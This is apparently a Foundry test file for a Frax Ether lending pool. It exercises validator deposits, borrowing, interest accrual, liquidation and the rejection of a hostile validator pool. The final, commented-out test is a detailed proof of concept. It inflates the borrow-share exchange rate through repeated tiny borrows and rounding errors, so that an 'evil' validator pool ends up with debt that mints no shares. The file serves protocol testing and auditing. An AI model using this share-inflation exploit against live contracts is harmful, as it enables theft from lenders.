// SPDX-License-Identifier: ISC
pragma solidity ^0.8.23;

import "./02_TestCMDeposit.t.sol";

contract TestCMFullRoundTrip is CombinedMegaBaseTest, depositValidatorFunctions {
    using logSnapshot for *;
    using LendingPoolStructHelper for LendingPool;
    using RedemptionQueueStructHelper for FraxEtherRedemptionQueueV2;

    function setUp() public {
        /// BACKGROUND: All base contracts have been deployed and configured
        _defaultSetup();

        /// BACKGROUND: Beacon oracle has set the credit per validator to 28E
        _beaconOracle_setVPoolCreditPerValidatorI48_E12(validatorPoolAddress, 28e12);

        // Zero out any ETH and frxETH in the EtherRouter and CurveLsdAMO
        vm.deal(etherRouterAddress, 0);
        vm.deal(curveLsdAmoAddress, 0);

        // Test user deposits some ETH for frxETH
        vm.startPrank(testUserAddress);
        vm.deal(testUserAddress, 35 ether);
        fraxEtherMinter.mintFrxEth{ value: 35 ether }();
        vm.stopPrank();

        // Sweep 25 ETH to the Redemption Queue and/or Curve AMO(s) and leave 10 ETH in the EtherRouter
        // This is to simulate mixed ETH in various places and force LP unwinding at the Curve AMO
        vm.startPrank(ConstantsSBTS.Mainnet.CURVEAMO_OPERATOR_ADDRESS);
        etherRouter.sweepEther(25 ether, true); // Put in LP
        vm.stopPrank();

        /// Take initial snapshots
        // -----------------------------------------
        _validatorDepositInfoSnapshotInitial = validatorDepositInfoSnapshot(validatorPublicKeys[0], lendingPool);
        _validatorPoolAccountingSnapshotInitial = validatorPoolAccountingSnapshot(validatorPool);
        _amoAccountingFinals[0] = initialAmoSnapshot(curveLsdAmoAddress);
        _amoPoolAccountingFinals[0] = initialPoolSnapshot(curveLsdAmoAddress);
        _initialSystemSnapshot = initialSystemSnapshot(validatorPoolOwner, bytes(""), lendingPool, validatorPool);
        // -----------------------------------------

        {
            (
                uint256 _interestAccrued,
                uint256 _ethTotalBalanced,
                uint256 _totalNonValidatorEthSum,
                uint256 _optimisticValidatorEth,
                uint256 _ttlSystemEth
            ) = printAndReturnSystemStateInfo("======== AT START ========", true);
            totalNonValidatorEthSums[0] = _totalNonValidatorEthSum;
        }
    }

    function _setupThreeValidators() internal {
        // Make 2 full deposits and 1 partial one
        // ======================================

        // Validator fully deposits 32 ETH for pkey 0
        console.log("<<<_fullValidatorDeposit [pkey 0]>>>");
        DepositCredentials memory _depositCredentialsPkey0 = _fullValidatorDeposit({
            _validatorPool: validatorPool,
            _validatorPublicKey: validatorPublicKeys[0],
            _validatorSignature: validatorSignatures[0]
        });

        // Validator fully deposits 32 ETH for pkey 1
        console.log("<<<_fullValidatorDeposit [pkey 1]>>>");
        DepositCredentials memory _depositCredentialsPkey1 = _fullValidatorDeposit({
            _validatorPool: validatorPool,
            _validatorPublicKey: validatorPublicKeys[1],
            _validatorSignature: validatorSignatures[1]
        });

        // Validator partially deposits 8 ETH for pkey 2
        console.log("<<<_partialValidatorDeposit [pkey 2]>>>");
        DepositCredentials memory _depositCredentialsPkey2 = _partialValidatorDeposit({
            _validatorPool: validatorPool,
            _validatorPublicKey: validatorPublicKeys[2],
            _validatorSignature: validatorSignatures[2],
            _depositAmount: PARTIAL_DEPOSIT_AMOUNT
        });

        // Wait a day
        mineBlocksBySecond(1 days);

        // Beacon oracle approves both public keys
        console.log("<<<_beaconOracle_setValidatorApproval [pkeys 0-2]>>>");
        _beaconOracle_setValidatorApproval(validatorPublicKeys[0], validatorPoolAddress, uint32(block.timestamp));
        _beaconOracle_setValidatorApproval(validatorPublicKeys[1], validatorPoolAddress, uint32(block.timestamp));
        _beaconOracle_setValidatorApproval(validatorPublicKeys[2], validatorPoolAddress, uint32(block.timestamp));

        // Borrow the remaining 24 ETH for the pkey 2 validator
        console.log("<<<_requestFinalValidatorDepositByPkeyIdx [pkey 2]>>>");
        _requestFinalValidatorDepositByPkeyIdx(2);

        /// Update the validator count and allowance
        console.log("<<<setVPoolValidatorCount & setVPoolBorrowAllowanceWithBuffer>>>");
        _beaconOracle_setVPoolValidatorCount(validatorPoolAddress, 3);
        _beaconOracle_setVPoolBorrowAllowanceWithBuffer(validatorPoolAddress);

        {
            (
                uint256 _interestAccrued,
                uint256 _ethTotalBalanced,
                uint256 _totalNonValidatorEthSum,
                uint256 _optimisticValidatorEth,
                uint256 _ttlSystemEth
            ) = printAndReturnSystemStateInfo("======== AFTER 3 VALIDATOR (2 FULL, 1 PARTIAL) ========", true);
            totalNonValidatorEthSums[0] = _totalNonValidatorEthSum;
            totalSystemEthSums[0] = _ttlSystemEth;
        }
    }

    function CMFullRoundTripCore() public {
        // Make 2 full deposits and 1 partial one
        _setupThreeValidators();

        // Wait a week
        mineBlocksBySecond(7 days);

        // Accrue some interest
        lendingPool.addInterest(true);

        /// Take deltas after deposits
        // -----------------------------------------
        (_amoAccountingFinals[1], _amoAccountingNets[0]) = finalAMOSnapshot(_amoAccountingFinals[0]);
        (_amoPoolAccountingFinals[1], _amoPoolAccountingNets[0]) = finalPoolSnapshot(_amoPoolAccountingFinals[0]);
        _deltaValidatorDepositInfos[0] = deltaValidatorDepositInfoSnapshot(_validatorDepositInfoSnapshotInitial);
        _deltaValidatorPoolAccountings[0] = deltaValidatorPoolAccountingSnapshot(
            _validatorPoolAccountingSnapshotInitial
        );
        _deltaSystemSnapshots[0] = deltaSystemSnapshot(_initialSystemSnapshot);
        // -----------------------------------------

        // Make sure stored utilization matches live utilization
        checkStoredVsLiveUtilization();

        /// THEN the borrow shares should be equal to an amount that represents 24 ether, + some interest
        assertGe(
            lendingPool.toBorrowAmount(
                _deltaSystemSnapshots[0].end.validatorPool.lendingPool_validatorPoolAccount.borrowShares
            ),
            32 ether - PARTIAL_DEPOSIT_AMOUNT,
            "When a borrower borrows 24 ether, then: the borrow shares should be equal to an amount that represents 24 ether, plus some interest"
        );

        /// THEN some interest should have accrued
        assertGe(_deltaSystemSnapshots[0].delta.lendingPool.interestAccrued, 0, "Some interest should have accrued");

        /// THEN some utilization should have happened
        assertGe(_deltaSystemSnapshots[0].delta.lendingPool.utilization, 0, "Some utilization should have happened");

        {
            console.log("======== BEFORE BORROW ========");
            uint256 _borrowShares = lendingPool.__validatorPoolAccounts(validatorPoolAddress).borrowShares;
            console.log("_borrowShares (in shares): ", _borrowShares);
            console.log("_borrowShares (in ETH): ", lendingPool.toBorrowAmount(_borrowShares));
        }

        // Do a borrow
        uint256 _borrowAmount = 10 ether;
        vm.prank(validatorPoolOwner);
        validatorPool.borrow(validatorPoolOwner, _borrowAmount);

        // Make sure stored utilization matches live utilization
        checkStoredVsLiveUtilization();

        {
            console.log("======== AFTER BORROW ========");
            uint256 _borrowShares = lendingPool.__validatorPoolAccounts(validatorPoolAddress).borrowShares;
            console.log("_borrowShares (in shares): ", _borrowShares);
            console.log("_borrowShares (in ETH): ", lendingPool.toBorrowAmount(_borrowShares));
        }

        // Wait a week
        mineBlocksBySecond(5 days);

        // Make sure stored utilization matches live utilization
        checkStoredVsLiveUtilization();

        // Accrue some interest
        lendingPool.addInterest(false);

        // Make sure stored utilization matches live utilization
        checkStoredVsLiveUtilization();

        (uint256 _interestAccrued, , , , ) = printAndReturnSystemStateInfo(
            "======== AFTER MINING AND ACCRUING ========",
            true
        );

        /// Take deltas after the borrow
        // -----------------------------------------
        (_amoAccountingFinals[2], _amoAccountingNets[1]) = finalAMOSnapshot(_amoAccountingFinals[1]);
        (_amoPoolAccountingFinals[2], _amoPoolAccountingNets[1]) = finalPoolSnapshot(_amoPoolAccountingFinals[1]);
        _deltaValidatorDepositInfos[1] = deltaValidatorDepositInfoSnapshot(_deltaValidatorDepositInfos[0].start);
        _deltaValidatorPoolAccountings[1] = deltaValidatorPoolAccountingSnapshot(
            _deltaValidatorPoolAccountings[0].start
        );
        _deltaSystemSnapshots[1] = deltaSystemSnapshot(_deltaSystemSnapshots[0].end);
        // -----------------------------------------

        /// THEN the borrow amount should be around 24 ether + 10 ether + some interest
        assertApproxEqRel(
            (10 ether) + (32 ether - PARTIAL_DEPOSIT_AMOUNT) + _interestAccrued,
            lendingPool.toBorrowAmount(
                _deltaSystemSnapshots[1].end.validatorPool.lendingPool_validatorPoolAccount.borrowShares
            ),
            0.005e18, // 0.5%
            "Borrowed amount should be 24 ETH + 10 ETH + interest"
        );

        /// THEN some additional interest should have accrued
        assertGt(
            _deltaSystemSnapshots[1].delta.lendingPool.interestAccrued,
            0,
            "Some additional interest should have accrued"
        );

        /// THEN utilization should have increased, more than last time

        assertGe(
            _deltaSystemSnapshots[1].delta.lendingPool.utilization,
            0.25e5,
            "Utilization should have increased at least 25%"
        );
    }

    function test_CMFullRoundTripGracefulExit() public virtual {
        // Deposit & Borrow
        CMFullRoundTripCore();

        // Graceful exit here via repayments
        // ================================

        // Wind down
        // ================================
        // windDown(35 ether, totalNonValidatorEthSums[1]);
    }

    function test_CMFullRoundTripLiquidation() public virtual {
        // Deposit & Borrow
        CMFullRoundTripCore();

        // Liquidation logic
        // ================================

        // Wait 35 days, position should be insolvent now (over 84 ETH (28 allowance * 3 validators))
        console.log("<<<Mining blocks>>>");
        mineBlocksBySecond(35 days);

        // Make sure stored utilization matches live utilization
        checkStoredVsLiveUtilization();

        // Accrue some interest
        console.log("<<<Accruing interest>>>");
        lendingPool.addInterest(false);

        // Make sure stored utilization matches live utilization
        checkStoredVsLiveUtilization();

        // Print info
        printAndReturnSystemStateInfo("======== AFTER MINING AND ACCRUING ========", true);

        /// Take deltas after waiting
        // -----------------------------------------
        (_amoAccountingFinals[3], _amoAccountingNets[2]) = finalAMOSnapshot(_amoAccountingFinals[2]);
        (_amoPoolAccountingFinals[3], _amoPoolAccountingNets[2]) = finalPoolSnapshot(_amoPoolAccountingFinals[2]);
        _deltaValidatorDepositInfos[2] = deltaValidatorDepositInfoSnapshot(_deltaValidatorDepositInfos[1].start);
        _deltaValidatorPoolAccountings[2] = deltaValidatorPoolAccountingSnapshot(
            _deltaValidatorPoolAccountings[1].start
        );
        _deltaSystemSnapshots[2] = deltaSystemSnapshot(_deltaSystemSnapshots[1].end);
        // -----------------------------------------

        /// THEN the position should be insolvent
        assertEq(lendingPool.isSolvent(payable(validatorPool)), false, "Position should be insolvent now");

        /// GIVEN the beacon oracle has triggered the exit for the 3 validators
        // This is done offchain because the exit messages are escrowed
        console.log("<<<Simulate the exit coming back>>>");
        vm.deal(validatorPoolAddress, validatorPoolAddress.balance + (3 * (32 ether)));

        // /// GIVEN the beacon oracle has updated the count and allowance
        // vm.stopPrank();
        // console.log("<<<_beaconOracle_setVPoolValidatorCount>>>");
        // _beaconOracle_setVPoolValidatorCount(validatorPoolAddress, 0);
        // console.log("<<<_beaconOracle_setVPoolBorrowAllowanceWithBuffer>>>");
        // _beaconOracle_setVPoolBorrowAllowanceNoBuffer(validatorPoolAddress);
        // console.log("<<<Switch back to validator pool owner>>>");
        // vm.startPrank(validatorPoolOwner);

        // Print amount borrowed
        {
            uint256 _borrowShares = lendingPool.__validatorPoolAccounts(validatorPoolAddress).borrowShares;
            console.log("======== BEFORE LIQUIDATION ========");
            printAndReturnSystemStateInfo("", true);

            /// GIVEN the timelock forces a liquidation repay
            vm.startPrank(Constants.Mainnet.TIMELOCK_ADDRESS);
            console.log("<<<Liquidate the validator pool>>>");
            lendingPool.liquidate(payable(validatorPool), lendingPool.toBorrowAmount(_borrowShares));
            vm.stopPrank();

            // Make sure stored utilization matches live utilization
            checkStoredVsLiveUtilization();

            // // Give some ETH to the VP owner
            // vm.deal(validatorPoolOwner, 250 ether);

            /// GIVEN the validator pool owner honestly repays some interest
            // NOTE: In practice, liquidation will occur before excess interest occurs, which the borrower can "welch" on
            // _borrowShares = lendingPool.__validatorPoolAccounts(validatorPoolAddress).borrowShares;
            // vm.startPrank(validatorPoolOwner);
            // validatorPool.repayWithValue{ value: lendingPool.toBorrowAmount(_borrowShares) }();
            // vm.stopPrank();

            // The liquidated validator pool owner collects his remaining scraps from the validator pool
            vm.startPrank(validatorPoolOwner);
            console.log("<<<Withdraw scraps>>>");
            validatorPool.withdraw(validatorPoolOwner, validatorPoolAddress.balance);
            vm.stopPrank();

            console.log("======== AFTER LIQUIDATION ========");
            _borrowShares = lendingPool.__validatorPoolAccounts(validatorPoolAddress).borrowShares;
            console.log("_borrowShares (in shares): ", _borrowShares);
            console.log("_borrowShares (in ETH): ", lendingPool.toBorrowAmount(_borrowShares));
        }

        /// Take deltas after liquidation
        // -----------------------------------------
        (_amoAccountingFinals[4], _amoAccountingNets[3]) = finalAMOSnapshot(_amoAccountingFinals[3]);
        (_amoPoolAccountingFinals[4], _amoPoolAccountingNets[3]) = finalPoolSnapshot(_amoPoolAccountingFinals[3]);
        _deltaValidatorDepositInfos[3] = deltaValidatorDepositInfoSnapshot(_deltaValidatorDepositInfos[2].start);
        _deltaValidatorPoolAccountings[3] = deltaValidatorPoolAccountingSnapshot(
            _deltaValidatorPoolAccountings[2].start
        );
        _deltaSystemSnapshots[3] = deltaSystemSnapshot(_deltaSystemSnapshots[2].end);
        // -----------------------------------------

        /// THEN the borrow shares should be zero now after repayment
        assertEq(
            lendingPool.toBorrowAmount(
                _deltaSystemSnapshots[3].end.validatorPool.lendingPool_validatorPoolAccount.borrowShares
            ),
            0,
            "When the validator pool is liquidated, everything should be paid off"
        );

        // /// THEN utilization should be basically zero, minus some LP crumbs
        // assertApproxEqAbs(
        //     lendingPool.getUtilization(),
        //     1000,
        //     1000, // 0-2% from LP crumbs
        //     "Utilization should be basically nothing after everything has been repaid"
        // );

        // Disable the validators
        bytes[] memory pkTmpArr = new bytes[](3);
        pkTmpArr[0] = validatorPublicKeys[0];
        pkTmpArr[1] = validatorPublicKeys[1];
        pkTmpArr[2] = validatorPublicKeys[2];
        address[] memory vpAddrsArr = new address[](3);
        vpAddrsArr[0] = validatorPoolAddress;
        vpAddrsArr[1] = validatorPoolAddress;
        vpAddrsArr[2] = validatorPoolAddress;
        uint32[] memory stateTmpArr = new uint32[](3);
        stateTmpArr[0] = 0;
        stateTmpArr[1] = 0;
        stateTmpArr[2] = 0;
        _beaconOracle_setValidatorApprovals(pkTmpArr, vpAddrsArr, stateTmpArr);

        // Update the validator count and allowance
        _beaconOracle_setVPoolValidatorCount(validatorPoolAddress, 0);
        _beaconOracle_setVPoolBorrowAllowanceWithBuffer(validatorPoolAddress);

        // Make sure stored utilization matches live utilization
        checkStoredVsLiveUtilization();

        // END STATE TESTS
        // -----------------------------------------
        /// Take beginning -> end deltas after liquidation
        // -----------------------------------------
        // (_amoAccountingFinals[5], _amoAccountingNets[4]) = finalAMOSnapshot(_amoAccountingFinals[0]);
        // (_amoPoolAccountingFinals[5], _amoPoolAccountingNets[4]) = finalPoolSnapshot(_amoPoolAccountingFinals[0]);
        // _deltaValidatorDepositInfos[4] = deltaValidatorDepositInfoSnapshot(_validatorDepositInfoSnapshotInitial);
        // _deltaValidatorPoolAccountings[4] = deltaValidatorPoolAccountingSnapshot(
        //     _validatorPoolAccountingSnapshotInitial
        // );
        // _deltaSystemSnapshots[4] = deltaSystemSnapshot(_initialSystemSnapshot);

        // Check the sum of all of the ETH not in validators
        (totalNonValidatorEthSums[1], totalSystemEthSums[1]) = checkTotalSystemEth(
            "======== AFTER LIQUIDATION ========",
            35 ether
        );

        // Wind down
        // ================================
        windDown(35 ether, totalNonValidatorEthSums[1]);

        console.log("==================== CONSOLIDATED ETHER BALANCE (PATH 1 [false, false]) ====================");
        {
            EtherRouter.CachedConsEFxBalances memory _cachedBals = etherRouter.getConsolidatedEthFrxEthBalance(
                false,
                false
            );
            console.log("ER ethFree: ", _cachedBals.ethFree);
            console.log("ER ethInLpBalanced: ", _cachedBals.ethInLpBalanced);
            console.log("ER ethTotalBalanced: ", _cachedBals.ethTotalBalanced);
            console.log("ER frxEthFree: ", _cachedBals.frxEthFree);
            console.log("ER frxEthInLpBalanced: ", _cachedBals.frxEthInLpBalanced);
        }

        console.log("==================== CONSOLIDATED ETHER BALANCE (PATH 2 [true, false]) ====================");
        {
            EtherRouter.CachedConsEFxBalances memory _cachedBals = etherRouter.getConsolidatedEthFrxEthBalance(
                true,
                false
            );
            console.log("ER ethFree: ", _cachedBals.ethFree);
            console.log("ER ethInLpBalanced: ", _cachedBals.ethInLpBalanced);
            console.log("ER ethTotalBalanced: ", _cachedBals.ethTotalBalanced);
            console.log("ER frxEthFree: ", _cachedBals.frxEthFree);
            console.log("ER frxEthInLpBalanced: ", _cachedBals.frxEthInLpBalanced);
        }

        console.log("==================== CONSOLIDATED ETHER BALANCE (PATH 3 [false, true]) ====================");
        {
            EtherRouter.CachedConsEFxBalances memory _cachedBals = etherRouter.getConsolidatedEthFrxEthBalance(
                false,
                true
            );
            console.log("ER ethFree: ", _cachedBals.ethFree);
            console.log("ER ethInLpBalanced: ", _cachedBals.ethInLpBalanced);
            console.log("ER ethTotalBalanced: ", _cachedBals.ethTotalBalanced);
            console.log("ER frxEthFree: ", _cachedBals.frxEthFree);
            console.log("ER frxEthInLpBalanced: ", _cachedBals.frxEthInLpBalanced);
        }

        console.log("==================== CONSOLIDATED ETHER BALANCE (PATH 4 [true, true]) ====================");
        {
            EtherRouter.CachedConsEFxBalances memory _cachedBals = etherRouter.getConsolidatedEthFrxEthBalance(
                true,
                true
            );
            console.log("ER ethFree: ", _cachedBals.ethFree);
            console.log("ER ethInLpBalanced: ", _cachedBals.ethInLpBalanced);
            console.log("ER ethTotalBalanced: ", _cachedBals.ethTotalBalanced);
            console.log("ER frxEthFree: ", _cachedBals.frxEthFree);
            console.log("ER frxEthInLpBalanced: ", _cachedBals.frxEthInLpBalanced);
        }
    }

    function testWithdraw3ExitDeadBeaconOldPartialKeys() public {
        // Deposit & Borrow
        CMFullRoundTripCore();

        // Trigger 3 validators to exit
        // Done off-chain

        // Wait 3 days for the exit
        mineBlocksBySecond(3 days);

        // Accrue some interest
        lendingPool.addInterest(false);

        // 96 ETH from the exit is dumped into the validator pool
        vm.deal(validatorPoolAddress, 96 ether);

        // Make sure stored utilization matches live utilization
        checkStoredVsLiveUtilization();

        // Create a second (hostile) validator pool with another user
        hoax(testUserAddress);
        address payable _validatorPoolHostileAddress = lendingPool.deployValidatorPool(
            testUserAddress,
            bytes32(block.timestamp)
        );
        ValidatorPool _hostileValidatorPool = ValidatorPool(_validatorPoolHostileAddress);

        // Beacon approves the hostile validator pool
        _beaconOracle_setVPoolCreditPerValidatorI48_E12(_validatorPoolHostileAddress, 28e12);

        // Give the hostile validator some ETH
        vm.deal(_validatorPoolHostileAddress, 96 ether);

        // -------------------------------------
        // Try to do a bunch of partial deposits with old keys (should fail due to PubKeyAlreadyFinalized)
        for (uint256 i = 0; i < 3; i++) {
            console.log("<<<validatorPool.deposit (PubKeyAlreadyFinalized test) [pkey #%s]>>>", i);

            // Make credentials
            DepositCredentials memory _depositCredentials = generateDepositCredentials(
                validatorPool,
                validatorPublicKeys[i],
                validatorSignatures[i],
                PARTIAL_DEPOSIT_AMOUNT
            );

            // Simulate a partial deposit event
            vm.startPrank(validatorPoolOwner);
            vm.expectRevert(abi.encodeWithSignature("PubKeyAlreadyFinalized()"));
            validatorPool.deposit{ value: PARTIAL_DEPOSIT_AMOUNT }(
                _depositCredentials.publicKey,
                _depositCredentials.signature,
                _depositCredentials.depositDataRoot
            );
            vm.stopPrank();
        }

        // Normal validator partially deposits 8 ETH for pkey 3
        console.log("<<<_partialValidatorDeposit [pkey 3]>>>");
        DepositCredentials memory _depositCredentialsPkey3 = _partialValidatorDeposit({
            _validatorPool: validatorPool,
            _validatorPublicKey: validatorPublicKeys[3],
            _validatorSignature: validatorSignatures[3],
            _depositAmount: PARTIAL_DEPOSIT_AMOUNT
        });

        // Wait a day
        mineBlocksBySecond(1 days);

        // Beacon oracle approves public key
        console.log("<<<_beaconOracle_setValidatorApproval [pkey 3]>>>");
        _beaconOracle_setValidatorApproval(validatorPublicKeys[3], validatorPoolAddress, uint32(block.timestamp));

        // Check ValidatorPoolKeyMismatch by trying to deposit on another validator pool's already deposited pubkey
        {
            console.log("<<<validatorPool.deposit (ValidatorPoolKeyMismatch test) [pkey #3]>>>");

            // Make credentials
            DepositCredentials memory _depositCredentials = generateDepositCredentials(
                _hostileValidatorPool,
                validatorPublicKeys[3],
                validatorSignatures[3],
                PARTIAL_DEPOSIT_AMOUNT
            );

            // Simulate a partial deposit event
            vm.startPrank(testUserAddress);
            vm.expectRevert(abi.encodeWithSignature("ValidatorPoolKeyMismatch()"));
            _hostileValidatorPool.deposit{ value: PARTIAL_DEPOSIT_AMOUNT }(
                _depositCredentials.publicKey,
                _depositCredentials.signature,
                _depositCredentials.depositDataRoot
            );
            vm.stopPrank();
        }
    }

    // foundry expectRevert doesn't work here, even when I try putting it directly above _validatorPool.deposit
    // Using a fail test instead
    function testFail_Withdraw3ExitDeadBeaconCannotFinalize() public {
        // Deposit & Borrow
        CMFullRoundTripCore();

        // Trigger 3 validators to exit
        // Done off-chain

        // Wait 3 days for the exit
        mineBlocksBySecond(3 days);

        // Accrue some interest
        lendingPool.addInterest(false);

        // 96 ETH from the exit is dumped into the validator pool
        vm.deal(validatorPoolAddress, 96 ether);

        // -------------------------------------
        vm.startPrank(validatorPoolOwner);

        // Do partial deposits new keys (should succeed)
        for (uint256 i = 5; i < 10; i++) {
            _partialValidatorDeposit({
                _validatorPool: validatorPool,
                _validatorPublicKey: validatorPublicKeys[i],
                _validatorSignature: validatorSignatures[i],
                _depositAmount: PARTIAL_DEPOSIT_AMOUNT
            });
        }

        // Fetch all of the validator DepositInfo structs and do some checks
        {
            LendingPool.ValidatorDepositInfo[] memory _vpkInfos = new LendingPool.ValidatorDepositInfo[](10);

            // Check the DepositInfo structs
            for (uint256 i = 5; i < 10; i++) {
                // Get the deposit info
                _vpkInfos[i] = lendingPool.__validatorDepositInfo(validatorPublicKeys[i]);

                /// THEN validator public key should NOT marked as approved because the beacon is dead
                assertFalse(
                    lendingPool.isValidatorApproved(validatorPublicKeys[i]),
                    "Validator pubkey should NOT be marked as approved"
                );

                /// THEN validator public key should NOT be marked as wasFullDepositOrFinalized
                assertFalse(
                    _vpkInfos[i].wasFullDepositOrFinalized,
                    "Validator pubkey should NOT be marked as being a full deposit and/or finalized"
                );
            }
        }

        // Try to finalize the deposits before the beacon does the approval (should fail because beacon is dead)
        for (uint256 i = 5; i < 10; i++) {
            // vm.expectRevert(abi.encodeWithSignature("ValidatorIsNotApprovedLP()"));
            _requestFinalValidatorDepositByPkeyIdx(i);

            // Make sure stored utilization matches live utilization
            checkStoredVsLiveUtilization();
        }
    }

    // function test_ManipulateShares() public {
    //     // Set the inflation borrow amount
    //     // uint256 INFLATION_BORROW_AMT = 1000 gwei;
    //     uint256 INFLATION_BORROW_AMT = 1;

    //     /*
    //     Attack Setup:
    //         - Have pubkeys approved for 1 honest and 1 evil validator and perform partial deposits for both.
    //         - Be approved some borrow allowance.
    //         - Use borrow allowance to manipulate exchange rate by borrowing and repaying debt.
    //         - At the end, finalise a validator deposit which does not require any borrow allowance.
    //     */

    //     // Mint additional frxETH so the ether router holds sufficient funds.
    //     vm.startPrank(testUserAddress);
    //     vm.deal(testUserAddress, 100 ether);
    //     fraxEtherMinter.mintFrxEth{ value: 100 ether }();
    //     vm.stopPrank();

    //     // Generate 2 partial deposits, one for an honest validator and the other for an evil validator.
    //     DepositCredentials memory _depositCredentialsPKey0 = _partialValidatorDeposit({
    //         _validatorPool: validatorPool,
    //         _validatorPublicKey: validatorPublicKeys[0],
    //         _validatorSignature: validatorSignatures[0],
    //         _depositAmount: 4 ether
    //     });
    //     DepositCredentials memory _depositCredentialsPKey1 = generateDepositCredentials(
    //         validatorPool,
    //         validatorPublicKeys[1],
    //         validatorSignatures[1],
    //         4 ether
    //     );

    //     // Perform direct partial deposit because we are using a pubkey signed by an honest validator instead of re-generating a signature for the evil validator.
    //     // Overwrite storage slot so we can mimic a deposit from another validator pool instead of generating a valid signature.
    //     vm.startPrank(evilValPoolOwner);
    //     vm.deal(evilValPoolOwner, 100 ether);
    //     vm.store(address(evilValPool), bytes32(uint256(4)), validatorPool.withdrawalCredentials());
    //     assert(evilValPool.withdrawalCredentials() == validatorPool.withdrawalCredentials());
    //     evilValPool.deposit{ value: 4 ether }(
    //         _depositCredentialsPKey1.publicKey,
    //         _depositCredentialsPKey1.signature,
    //         _depositCredentialsPKey1.depositDataRoot,
    //         4 ether
    //     );
    //     vm.stopPrank();

    //     // Default credit per validator is 28 ETH.
    //     // Approve pubkey for honest validator pool.
    //     _beaconOracle_setValidatorApproval(validatorPublicKeys[0], validatorPoolAddress, uint32(block.timestamp));
    //     _beaconOracle_setVPoolValidatorCount(validatorPoolAddress, 1);
    //     _beaconOracle_setVPoolBorrowAllowanceNoBuffer(validatorPoolAddress);

    //     // Approve pubkey for evil validator pool.
    //     _beaconOracle_setValidatorApproval(validatorPublicKeys[1], evilValPoolAddress, uint32(block.timestamp));
    //     _beaconOracle_setVPoolValidatorCount(evilValPoolAddress, 2);
    //     _beaconOracle_setVPoolBorrowAllowanceNoBuffer(evilValPoolAddress);

    //     // Initiate a borrow from a honest validator.
    //     vm.startPrank(validatorPoolOwner);
    //     uint256 _borrowAmount = 1000 gwei;
    //     validatorPool.borrow(validatorPoolOwner, _borrowAmount);
    //     vm.stopPrank();

    //     // Wait a day to generate some interest.
    //     mineBlocksBySecond(1 days);

    //     {
    //         (
    //             uint256 _interestAccrued,
    //             uint256 _ethTotalBalanced,
    //             uint256 _totalNonValidatorEthSum,
    //             uint256 _optimisticValidatorEth,
    //             uint256 _ttlSystemEth
    //         ) = printAndReturnSystemStateInfo("======== AFTER 2 VALIDATOR (2 PARTIAL) AND BORROW (1000 gwei) ========", true);
    //     }

    //     // Repay some amount on behalf of the honest validator pool.
    //     vm.startPrank(evilValPoolOwner);
    //     (uint256 totalBorrowAmount, uint256 totalBorrowShares) = lendingPool.totalBorrow();
    //     uint256 _amountToRepay = ((totalBorrowShares - 10000) * totalBorrowAmount) / totalBorrowShares;
    //     lendingPool.repay{ value: _amountToRepay }(address(validatorPool));
    //     {
    //         (
    //             uint256 _interestAccrued,
    //             uint256 _ethTotalBalanced,
    //             uint256 _totalNonValidatorEthSum,
    //             uint256 _optimisticValidatorEth,
    //             uint256 _ttlSystemEth
    //         ) = printAndReturnSystemStateInfo("======== AFTER DEBT REPAYMENT ========", true);
    //     }

    //     // Inflate total borrowed amount without minting shares.
    //     _borrowAmount = INFLATION_BORROW_AMT;
    //     for (uint i = 0; i < 10000; i++) {
    //         evilValPool.borrow(evilValPoolOwner, _borrowAmount);
    //     }
    //     {
    //         (
    //             uint256 _interestAccrued,
    //             uint256 _ethTotalBalanced,
    //             uint256 _totalNonValidatorEthSum,
    //             uint256 _optimisticValidatorEth,
    //             uint256 _ttlSystemEth
    //         ) = printAndReturnSystemStateInfo("======== AFTER BORROW ROUNDING [INFLATE BORROW w/ NO SHARES] ========", true);
    //     }

    //     // Reduce shares such that the exchange rate of total borrowed to shares is 2:1
    //     (totalBorrowAmount, totalBorrowShares) = lendingPool.totalBorrow();
    //     _amountToRepay = ((totalBorrowShares - 1) * totalBorrowAmount) / totalBorrowShares;
    //     lendingPool.repay{ value: _amountToRepay }(address(validatorPool));
    //     evilValPool.borrow(evilValPoolOwner, 1);
    //     evilValPool.borrow(evilValPoolOwner, 1);
    //     vm.stopPrank();

    //     vm.startPrank(validatorPoolOwner);
    //     lendingPool.repay{ value: 3 }(address(validatorPool));
    //     vm.stopPrank();
    //     {
    //         (
    //             uint256 _interestAccrued,
    //             uint256 _ethTotalBalanced,
    //             uint256 _totalNonValidatorEthSum,
    //             uint256 _optimisticValidatorEth,
    //             uint256 _ttlSystemEth
    //         ) = printAndReturnSystemStateInfo("======== AFTER REPAYING ALL BUT ONE SHARE ========", true);
    //     }

    //     // Inflate rounding error.
    //     _borrowAmount = 1;
    //     vm.startPrank(evilValPoolOwner);
    //     for (uint i = 0; i < 65; i++) {
    //         evilValPool.borrow(evilValPoolOwner, _borrowAmount);
    //         _borrowAmount *= 2;
    //     }
    //     vm.stopPrank();
    //     {
    //         (
    //             uint256 _interestAccrued,
    //             uint256 _ethTotalBalanced,
    //             uint256 _totalNonValidatorEthSum,
    //             uint256 _optimisticValidatorEth,
    //             uint256 _ttlSystemEth
    //         ) = printAndReturnSystemStateInfo("======== AFTER BORROWING AND ACCUMULATING [INFLATION ROUNDING ERROR] ========", true);
    //     }

    //     // Request the final deposit for the evil validator such that no debt shares are minted, allowing them to withdraw without any repayment.
    //     DepositCredentials memory _finalDepositCredentials = generateDepositCredentials(
    //         evilValPool,
    //         validatorPublicKeys[1],
    //         validatorSignatures[1],
    //         32 ether - 4 ether
    //     );

    //     (uint256 totalBorrowAmountBefore, uint256 totalBorrowSharesBefore) = lendingPool.totalBorrow();
    //     vm.startPrank(evilValPoolOwner);
    //     evilValPool.requestFinalDeposit(
    //         _finalDepositCredentials.publicKey,
    //         _finalDepositCredentials.signature,
    //         _finalDepositCredentials.depositDataRoot
    //     );
    //     vm.stopPrank();
    //     (uint256 totalBorrowAmountAfter, uint256 totalBorrowSharesAfter) = lendingPool.totalBorrow();
    //     {
    //         (
    //             uint256 _interestAccrued,
    //             uint256 _ethTotalBalanced,
    //             uint256 _totalNonValidatorEthSum,
    //             uint256 _optimisticValidatorEth,
    //             uint256 _ttlSystemEth
    //         ) = printAndReturnSystemStateInfo("======== AFTER BORROWING AND MINTING NO NEW SHARES ========", true);
    //     }

    //     // Verify that no debt shares were created for the evil validator and that total borrowed was inflated.
    //     (bool a, bool b, uint32 c, uint32 d, uint48 e, uint128 f, uint256 valDebtShares) = lendingPool.validatorPoolAccounts(address(evilValPool));
    //     assert(valDebtShares == 0 && totalBorrowAmountAfter > totalBorrowAmountBefore && totalBorrowSharesBefore == totalBorrowSharesAfter);
    // }
}
